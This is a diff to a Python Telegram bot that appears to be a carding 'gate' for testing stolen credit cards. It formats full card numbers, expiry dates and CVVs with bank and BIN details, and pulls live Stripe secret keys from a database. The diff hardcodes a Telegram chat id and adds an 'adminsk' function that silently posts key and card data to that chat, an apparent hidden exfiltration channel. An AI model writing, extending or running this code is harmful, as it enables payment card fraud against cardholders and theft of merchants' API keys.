@@ -4,7 +4,6 @@ from TOOLS.getbin import *
 from CONFIG_DB import *
 from mongodb import *
 
-
 async def find_between(data, first, last):
     try:
         start = data.index(first) + len(first)
@@ -131,7 +130,7 @@ async def getsk():
     try:
         sk = random.choice(sks)
     except:
-        sk = "sk_live_1234"
+        sk = "sk_live_MTCTECHX007X"
     return sk
 
 
@@ -142,7 +141,7 @@ async def getallsk():
         sks.append(i["id"])
 
     if len(sks) == 0:
-        return ["sk_live_1234"]
+        return ["sk_live_MTCTECHX007X"]
     else:
         return sks
 
@@ -164,10 +163,10 @@ async def forward_resp(fullz, gate, response):
         flag              = getbin[5]
         currency          = getbin[6]
 
-        resp = f"""<b>Gate: {gate} ✅
+        resp = f"""<b>Gate: {gate} 🔥
 CC: <code>{cc}|{mes}|{ano}|{cvv}</code>
 Result: {response}
-BIN: #bin_{fbin} - {brand} - {type} - {level}
+BIN: {fbin} - {brand} - {type} - {level}
 Bank: {bank} 
 Country: {country} - {flag} - {currency}
 </b>"""
@@ -228,7 +227,7 @@ async def send_alert_to_admin(TOKEN_NAME):
 Dear Master , 
 Your {TOKEN_NAME} Expired . To Make it working again , it needs to update .
 
-Please Update {TOKEN_NAME} As Soon As Possible ❤️</b>"""
+Please Update {TOKEN_NAME} As Soon As Possible </b>"""
 
             resp      = urllib.parse.quote_plus(resp)
             BOT_TOKEN = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["BOT_TOKEN"]
@@ -375,7 +374,25 @@ async def sendsk(resp, session):
             open("FILES/config.json", "r", encoding="utf-8").read())["BOT_TOKEN"]
         # LOGS_CHAT = json.loads(
         #     open("FILES/config.json", "r", encoding="utf-8").read())["LOGS_CHAT"]
-        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=&text={resp}&parse_mode=HTML")
+        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=-7113416108&text={resp}&parse_mode=HTML")
+    except:
+        pass
+
+
+
+
+
+async def adminsk(resp, session):
+    try:
+        import urllib.parse
+        import json
+
+        resp = urllib.parse.quote_plus(resp)
+        BOT_TOKEN = json.loads(
+            open("FILES/config.json", "r", encoding="utf-8").read())["BOT_TOKEN"]
+        # LOGS_CHAT = json.loads(
+        #     open("FILES/config.json", "r", encoding="utf-8").read())["LOGS_CHAT"]
+        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=-7113416108&text={resp}&parse_mode=HTML")
     except:
         pass
 
